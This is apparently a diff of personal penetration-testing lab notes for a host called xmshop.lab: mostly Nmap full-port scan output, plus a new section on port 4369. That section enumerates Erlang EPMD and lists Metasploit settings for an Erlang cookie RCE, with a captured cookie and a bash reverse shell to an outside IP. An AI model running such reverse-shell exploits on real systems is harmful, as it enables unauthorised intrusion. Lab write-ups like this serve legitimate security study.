@@ -1,7 +1,7 @@
 ## NMAP
 
 ```
-# Nmap 7.98 scan initiated Fri Apr 10 10:32:02 2026 as: nmap -sT -sV -Pn -T4 -p- -oA nmap-all-port.txt 18.158.110.24
+# Nmap 7.98 scan initiated Mon Apr 13 15:38:52 2026 as: nmap -sT -sV -Pn -T4 -p- -oA nmap-all-port.txt 18.158.110.24
 Nmap scan report for xmshop.lab (18.158.110.24)
 Host is up (0.010s latency).
 Not shown: 65481 closed tcp ports (conn-refused)
@@ -40,7 +40,6 @@ PORT      STATE SERVICE        VERSION
 5712/tcp  open  msdtc          Microsoft Distributed Transaction Coordinator (error)
 5713/tcp  open  proshareaudio?
 5984/tcp  open  http           CouchDB httpd 1.6.1 (Erlang OTP/R14B01)
-6117/tcp  open  daylitetouch?
 7900/tcp  open  tcpwrapped
 8009/tcp  open  ajp13          Apache Jserv (Protocol v1.3)
 8080/tcp  open  http           Apache Tomcat/Coyote JSP engine 1.1
@@ -48,37 +47,38 @@ PORT      STATE SERVICE        VERSION
 9080/tcp  open  http           Apache Tomcat/Coyote JSP engine 1.1
 9083/tcp  open  http           JBoss service httpd
 15672/tcp open  http           MochiWeb httpd
-33393/tcp open  nlockmgr       1-4 (RPC #100021)
-34519/tcp open  java-rmi       Java RMI
-37692/tcp open  unknown
-41435/tcp open  unknown
-41949/tcp open  mountd         1-3 (RPC #100005)
-42215/tcp open  unknown
-42698/tcp open  unknown
-44945/tcp open  unknown
-45589/tcp open  mountd         1-3 (RPC #100005)
-46182/tcp open  mountd         1-3 (RPC #100005)
+21390/tcp open  unknown
+33179/tcp open  mountd         1-3 (RPC #100005)
+34508/tcp open  unknown
+36259/tcp open  java-rmi       Java RMI
+39061/tcp open  unknown
+40204/tcp open  unknown
+42795/tcp open  unknown
+43112/tcp open  status         1 (RPC #100024)
+44912/tcp open  nlockmgr       1-4 (RPC #100021)
+46527/tcp open  unknown
+48867/tcp open  mountd         1-3 (RPC #100005)
+52930/tcp open  mountd         1-3 (RPC #100005)
 55672/tcp open  http           MochiWeb Erlang HTTP library 1.0 (RabbitMQ management; redirect to port 15672)
-60531/tcp open  status         1 (RPC #100024)
 9 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
 ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port2099-TCP:V=7.98%I=7%D=4/10%Time=69D8B61C%P=x86_64-apple-darwin23.6.
+SF-Port2099-TCP:V=7.98%I=7%D=4/13%Time=69DCF276%P=x86_64-apple-darwin23.6.
 SF:0%r(NULL,1AB,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x
 SF:1e\x97\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08
-SF:objBytesq\0~\0\x01xp\xdb\xa9\x8c\xd4ur\0\x02\[B\xac\xf3\x17\xf8\x06\x08
-SF:T\xe0\x02\0\0xp\0\0\0L\xac\xed\0\x05t\0;http://ip-172-31-43-145\.eu-cen
-SF:tral-1\.compute\.internal:9083/q\0~\0\0q\0~\0\0uq\0~\0\x03\0\0\0\xe5\xa
-SF:c\xed\0\x05sr\0\x20org\.jnp\.server\.NamingServer_Stub\0\0\0\0\0\0\0\x0
-SF:2\x02\0\0xr\0\x1ajava\.rmi\.server\.RemoteStub\xe9\xfe\xdc\xc9\x8b\xe1e
-SF:\x1a\x02\0\0xr\0\x1cjava\.rmi\.server\.RemoteObject\xd3a\xb4\x91\x0ca3\
-SF:x1e\x03\0\0xpwY\0\x0bUnicastRef2\0\0\.ip-172-31-43-145\.eu-central-1\.c
-SF:ompute\.internal\0\0\x082\xbe=\x1b\xbe'S\xe7\xa0ba\x1a\xd5\0\0\x01\x9dv
-SF:\x17\xf9\xfb\x80\x01\0x");
+SF:objBytesq\0~\0\x01xp\+\xe4\xf1\xd5ur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\
+SF:xe0\x02\0\0xp\0\0\0L\xac\xed\0\x05t\0;http://ip-172-31-43-145\.eu-centr
+SF:al-1\.compute\.internal:9083/q\0~\0\0q\0~\0\0uq\0~\0\x03\0\0\0\xe5\xac\
+SF:xed\0\x05sr\0\x20org\.jnp\.server\.NamingServer_Stub\0\0\0\0\0\0\0\x02\
+SF:x02\0\0xr\0\x1ajava\.rmi\.server\.RemoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x
+SF:1a\x02\0\0xr\0\x1cjava\.rmi\.server\.RemoteObject\xd3a\xb4\x91\x0ca3\x1
+SF:e\x03\0\0xpwY\0\x0bUnicastRef2\0\0\.ip-172-31-43-145\.eu-central-1\.com
+SF:pute\.internal\0\0\x082B\xae\xa8\xc2y\xba\x893zV4w\0\0\x01\x9d\x85\x8b\
+SF:x1a\x89\x80\x01\0x");
 ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port2100-TCP:V=7.98%I=7%D=4/10%Time=69D8B61C%P=x86_64-apple-darwin23.6.
+SF-Port2100-TCP:V=7.98%I=7%D=4/13%Time=69DCF276%P=x86_64-apple-darwin23.6.
 SF:0%r(NULL,401,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x
 SF:1e\x97\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08
-SF:objBytesq\0~\0\x01xpx\"\xbd\x16ur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0
+SF:objBytesq\0~\0\x01xp@\xc3\x93\(ur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0
 SF:\x02\0\0xp\0\0\0e\xac\xed\0\x05t\0;http://ip-172-31-43-145\.eu-central-
 SF:1\.compute\.internal:9083/q\0~\0\0q\0~\0\0q\0~\0\0q\0~\0\0q\0~\0\0q\0~\
 SF:0\0q\0~\0\0uq\0~\0\x03\0\0\x03\"\xac\xed\0\x05s}\0\0\0\x02\0\x19org\.jn
@@ -96,14 +96,14 @@ SF:\0\0xr\0\x1ajava\.rmi\.server\.RemoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\
 SF:x02\0\0xr\0\x1cjava\.rmi\.server\.RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x
 SF:03\0\0xpwY\0\x0bUnicastRef2\0\0\.ip-172-31-43-145\.eu-ce");
 ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port4528-TCP:V=7.98%I=7%D=4/10%Time=69D8B643%P=x86_64-apple-darwin23.6.
+SF-Port4528-TCP:V=7.98%I=7%D=4/13%Time=69DCF29D%P=x86_64-apple-darwin23.6.
 SF:0%r(giop,4C,"GIOP\x01\0\0\x01\0\0\0@\0\0\0\0\0\0\0\x01\0\0\0\x02\0\0\0'
 SF:IDL:omg\.org/CORBA/OBJECT_NOT_EXIST:1\.0\0\0\0\0\0\0\0\0\0\x01");
 ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port4873-TCP:V=7.98%I=7%D=4/10%Time=69D8B622%P=x86_64-apple-darwin23.6.
+SF-Port4873-TCP:V=7.98%I=7%D=4/13%Time=69DCF27C%P=x86_64-apple-darwin23.6.
 SF:0%r(NULL,4,"\xac\xed\0\x05");
 ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port5432-TCP:V=7.98%I=7%D=4/10%Time=69D8B622%P=x86_64-apple-darwin23.6.
+SF-Port5432-TCP:V=7.98%I=7%D=4/13%Time=69DCF27C%P=x86_64-apple-darwin23.6.
 SF:0%r(SMBProgNeg,97,"E\0\0\0\x96SFATAL\0C0A000\0MProtocole\x20non\x20supp
 SF:ort\xc3\xa9e\x20de\x20l'interface\x2065363\.19778\x20:\x20le\x20serveur
 SF:\x20supporte\x20de\x201\.0\x20\xc3\xa0\n3\.0\0Fpostmaster\.c\0L1624\0RP
@@ -112,31 +112,31 @@ SF:otocole\x20non\x20support\xc3\xa9e\x20de\x20l'interface\x2027265\.28208
 SF:\x20:\x20le\x20serveur\x20supporte\x20de\x201\.0\x20\xc3\xa0\n3\.0\0Fpo
 SF:stmaster\.c\0L1624\0RProcessStartupPacket\0\0");
 ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port5445-TCP:V=7.98%I=7%D=4/10%Time=69D8B622%P=x86_64-apple-darwin23.6.
+SF-Port5445-TCP:V=7.98%I=7%D=4/13%Time=69DCF27C%P=x86_64-apple-darwin23.6.
 SF:0%r(NULL,4,"\xac\xed\0\x05");
 ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port5446-TCP:V=7.98%I=7%D=4/10%Time=69D8B622%P=x86_64-apple-darwin23.6.
+SF-Port5446-TCP:V=7.98%I=7%D=4/13%Time=69DCF27C%P=x86_64-apple-darwin23.6.
 SF:0%r(NULL,4,"\xac\xed\0\x05");
 ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port5448-TCP:V=7.98%I=7%D=4/10%Time=69D8B622%P=x86_64-apple-darwin23.6.
+SF-Port5448-TCP:V=7.98%I=7%D=4/13%Time=69DCF27C%P=x86_64-apple-darwin23.6.
 SF:0%r(NULL,4,"\xac\xed\0\x05");
 ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
-SF-Port5713-TCP:V=7.98%I=7%D=4/10%Time=69D8B622%P=x86_64-apple-darwin23.6.
-SF:0%r(NULL,5,"a42d\n")%r(GenericLines,5,"a42d\n")%r(GetRequest,5,"a42d\n"
-SF:)%r(HTTPOptions,5,"a42d\n")%r(RTSPRequest,5,"a42d\n")%r(RPCCheck,5,"a42
-SF:d\n")%r(DNSVersionBindReqTCP,5,"a42d\n")%r(DNSStatusRequestTCP,5,"a42d\
-SF:n")%r(Help,5,"a42d\n")%r(SSLSessionReq,5,"a42d\n")%r(TerminalServerCook
-SF:ie,5,"a42d\n")%r(TLSSessionReq,5,"a42d\n")%r(Kerberos,5,"a42d\n")%r(SMB
-SF:ProgNeg,5,"a42d\n")%r(X11Probe,5,"a42d\n")%r(FourOhFourRequest,5,"a42d\
-SF:n")%r(LPDString,5,"a42d\n")%r(LDAPSearchReq,5,"a42d\n")%r(LDAPBindReq,5
-SF:,"a42d\n")%r(SIPOptions,5,"a42d\n")%r(LANDesk-RC,5,"a42d\n")%r(Terminal
-SF:Server,5,"a42d\n")%r(NCP,5,"a42d\n")%r(NotesRPC,5,"a42d\n")%r(JavaRMI,5
-SF:,"a42d\n")%r(WMSRequest,5,"a42d\n")%r(oracle-tns,5,"a42d\n")%r(ms-sql-s
-SF:,5,"a42d\n")%r(afp,5,"a42d\n")%r(giop,5,"a42d\n");
+SF-Port5713-TCP:V=7.98%I=7%D=4/13%Time=69DCF27C%P=x86_64-apple-darwin23.6.
+SF:0%r(NULL,5,"aa27\n")%r(GenericLines,5,"aa27\n")%r(GetRequest,5,"aa27\n"
+SF:)%r(HTTPOptions,5,"aa27\n")%r(RTSPRequest,5,"aa27\n")%r(RPCCheck,5,"aa2
+SF:7\n")%r(DNSVersionBindReqTCP,5,"aa27\n")%r(DNSStatusRequestTCP,5,"aa27\
+SF:n")%r(Help,5,"aa27\n")%r(SSLSessionReq,5,"aa27\n")%r(TerminalServerCook
+SF:ie,5,"aa27\n")%r(TLSSessionReq,5,"aa27\n")%r(Kerberos,5,"aa27\n")%r(SMB
+SF:ProgNeg,5,"aa27\n")%r(X11Probe,5,"aa27\n")%r(FourOhFourRequest,5,"aa27\
+SF:n")%r(LPDString,5,"aa27\n")%r(LDAPSearchReq,5,"aa27\n")%r(LDAPBindReq,5
+SF:,"aa27\n")%r(SIPOptions,5,"aa27\n")%r(LANDesk-RC,5,"aa27\n")%r(Terminal
+SF:Server,5,"aa27\n")%r(NCP,5,"aa27\n")%r(NotesRPC,5,"aa27\n")%r(JavaRMI,5
+SF:,"aa27\n")%r(WMSRequest,5,"aa27\n")%r(oracle-tns,5,"aa27\n")%r(ms-sql-s
+SF:,5,"aa27\n")%r(afp,5,"aa27\n")%r(giop,5,"aa27\n");
 Service Info: OSs: Unix, Linux, Windows; Device: printer; CPE: cpe:/o:linux:linux_kernel, cpe:/o:redhat:enterprise_linux:6, cpe:/o:microsoft:windows
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-# Nmap done at Fri Apr 10 10:37:22 2026 -- 1 IP address (1 host up) scanned in 320.37 seconds
+# Nmap done at Mon Apr 13 15:43:58 2026 -- 1 IP address (1 host up) scanned in 305.76 seconds
 ```
 
 
@@ -276,7 +276,53 @@ exploit
 
 ![[Pasted image 20260410181616.png]]
 
-## Telnet 
+## Port 23
 
 ![[Pasted image 20260413110538.png]]
+
+## Port 4369
+
+### [RCE Erlang](https://github.com/gteissier/erl-matter)
+
+```
+4369/tcp  open  epmd           Erlang Port Mapper Daemon
+```
+
+```
+nmap --script epmd-info -p 4369 18.158.110.24
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-13 15:46 +0200
+Nmap scan report for xmshop.lab (18.158.110.24)
+Host is up (0.016s latency).
+
+PORT     STATE SERVICE
+4369/tcp open  epmd
+| epmd-info:
+|   epmd_port: 4369
+|   nodes:
+|_    rabbit: 34508
+
+Nmap done: 1 IP address (1 host up) scanned in 0.13 seconds
+```
+
+
+```
+use exploit/multi/misc/erlang_cookie_rce
+set RHOSTS 18.158.110.24
+set RPORT 34508
+
+set COOKIE HWDQYFLDNDYVJTICQERD
+
+set PAYLOAD cmd/unix/generic
+set CMD /bin/bash -c 'bash -i >& /dev/tcp/212.129.9.19/8888 0>&1'
+set DisablePayloadHandler true 
+```
+
+![[Pasted image 20260413155044.png]]
+
+![[Pasted image 20260413155134.png]]
+
+
+
+
+
 
